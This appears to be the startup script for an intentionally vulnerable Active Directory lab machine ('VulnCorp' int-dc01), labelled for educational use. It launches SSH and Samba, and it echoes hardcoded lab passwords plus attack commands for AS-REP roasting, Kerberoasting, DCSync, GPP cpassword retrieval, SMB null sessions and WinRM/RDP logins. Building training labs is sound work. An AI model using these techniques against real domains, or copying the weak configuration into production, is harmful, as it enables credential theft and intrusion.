#!/bin/bash
# ================================================================
# VulnCorp Lab — int-dc01 Entrypoint (Active Directory DC)
# ================================================================

echo "============================================="
echo "  VulnCorp Domain Controller (int-dc01)      "
echo "  Machine 7 | Internal Zone | 192.168.1.10   "
echo "  Domain: vulncorp.local (VULNCORP)          "
echo "============================================="

# Clean stale pid files
rm -f /var/run/sshd.pid /var/run/samba/*.pid /var/run/*.pid 2>/dev/null || true
mkdir -p /var/run/sshd /var/run/samba /var/lock/samba

# --- SSH ---
echo "[*] Starting SSH..."
/usr/sbin/sshd

# --- Samba 4 AD DC ---
echo "[*] Starting Samba Active Directory Domain Controller..."
# Ensure smbd/nmbd/winbind standalone services are stopped so samba AD DC can bind ports
killall smbd nmbd winbind 2>/dev/null || true
/usr/sbin/samba -D

sleep 3

echo ""
echo "============================================="
echo "  int-dc01 — All Services Running!           "
echo "============================================="
echo ""

check_port() {
    local port=$1 proto=$2 name=$3
    if ss -l"${proto}p" 2>/dev/null | grep -E ":$port\b" >/dev/null; then
        echo "[+] $name: Port $port ($proto) — LISTENING"
    else
        echo "[!] $name: Port $port ($proto) — WARNING: may not be listening"
    fi
}

check_port 53   "u" "DNS Server               "
check_port 88   "t" "Kerberos KDC             "
check_port 389  "t" "Active Directory LDAP    "
check_port 445  "t" "Microsoft SMB (Signing:NO)"
check_port 22   "t" "OpenSSH                  "

echo ""
echo "  [NOTE] RDP port 3389 is mapped in docker-compose — requires Windows for full RDP"
echo "  [NOTE] WinRM port 5985 is mapped in docker-compose — check /var/lib/winrm/banner.txt"

echo ""
echo "  Quick Access & Attack Vectors:"
echo "    Domain:        vulncorp.local (NetBIOS: VULNCORP)"
echo "    Admin:         Administrator:Corp@Admin2024  |  john.doe:Corp@Admin2024"
echo ""
echo "    AS-REP Roast:  GetNPUsers.py vulncorp.local/ -usersfile users.txt -dc-ip <IP>"
echo "    Kerberoast:    GetUserSPNs.py vulncorp.local/svc_backup:Backup@Svc2024 -dc-ip <IP> -request"
echo "    DCSync:        secretsdump.py vulncorp.local/svc_backup:Backup@Svc2024@<IP>"
echo "    SYSVOL GPP:    smbclient //<IP>/SYSVOL -N   (cpassword: VZBQoGpDMEUESqPnEFTqMg==)"
echo "    SMBv1:         smbclient -L //<IP> -N --option='min protocol=NT1'"
echo "    RDP (no NLA):  xfreerdp /v:<IP>:3389 /u:Administrator /p:Corp@Admin2024 /cert:ignore"
echo "    WinRM:         evil-winrm -i <IP> -u Administrator -p Corp@Admin2024"
echo "    SSH:           ssh john.doe@<IP> -p 2222 (pw: Corp@Admin2024)"
echo ""
echo "  Password Spray target: helpdesk:Helpdesk@123"
echo ""
echo "  WARNING: FOR EDUCATIONAL / LAB USE ONLY"
echo "============================================="

tail -f /dev/null
